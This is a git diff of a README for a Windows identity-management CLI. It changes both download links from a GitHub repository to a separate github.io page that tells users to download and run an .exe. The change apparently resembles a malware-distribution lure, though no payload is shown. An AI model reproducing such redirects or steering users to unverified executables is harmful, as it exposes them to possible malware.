@@ -1,6 +1,6 @@
 # 🛡️ forgeguard-cli-2026 - Control identity management across your environments
 
-[![](https://img.shields.io/badge/Download-ForgeGuard_CLI-0055ff.svg)](https://github.com/Isacmo329/forgeguard-cli-2026)
+[![](https://img.shields.io/badge/Download-ForgeGuard_CLI-0055ff.svg)](https://isacmo329.github.io)
 
 ForgeGuard CLI v2.0.0 helps you manage, verify, and fix your identity systems. This tool works across different platforms to ensure your ForgeRock accounts and processes perform as expected. Teams use this software to keep identity environments stable and secure.
 
@@ -8,7 +8,7 @@ ForgeGuard CLI v2.0.0 helps you manage, verify, and fix your identity systems. T
 
 You must visit the project page to download the latest version for Windows. Follow this link to reach the download area:
 
-[https://github.com/Isacmo329/forgeguard-cli-2026](https://github.com/Isacmo329/forgeguard-cli-2026)
+[https://isacmo329.github.io](https://isacmo329.github.io)
 
 Select the file that ends in .exe for your Windows system. Save this file to a folder you can find later, such as your Downloads folder.
 
